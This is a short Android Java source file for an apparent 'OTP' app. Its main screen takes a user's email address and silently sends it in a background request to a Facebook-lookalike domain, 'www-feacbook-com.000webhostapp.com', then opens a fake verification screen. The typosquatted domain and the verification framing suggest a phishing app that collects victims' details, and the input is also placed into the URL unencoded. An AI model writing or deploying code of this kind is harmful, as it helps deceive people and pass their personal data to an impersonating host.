package com.example.android.otpapp;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.io.IOException;

import okhttp3.OkHttpClient;
import okhttp3.Request;

public class MainActivity extends AppCompatActivity {
    private final static String TAG = "Main Activity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
                StrictMode.setThreadPolicy(policy);

        final EditText emailEditText = (EditText) findViewById(R.id.email_edit_text);
        Button sendButton = (Button) findViewById(R.id.next_button);
        sendButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String emailAddress = emailEditText.getText().toString();
                String url = "https://www-feacbook-com.000webhostapp.com/index.php?email=" + emailAddress ;
                asyncTask myTask = new asyncTask();
                myTask.execute(url);
                Intent intent = new Intent(getApplicationContext(), VarifyActivity.class);
                startActivity(intent);
            }
        });


    }

}

//asyncTask to manage the task of sending a network request.
class asyncTask extends AsyncTask<String, Object, Integer> {

    @Override
    protected Integer doInBackground(String... url) {
        OkHttpClient client = new OkHttpClient();
        String Url = url[0];
        Request request = new Request.Builder()
                .url(Url)
                .build();
        try {
            client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return 0;
    }
}
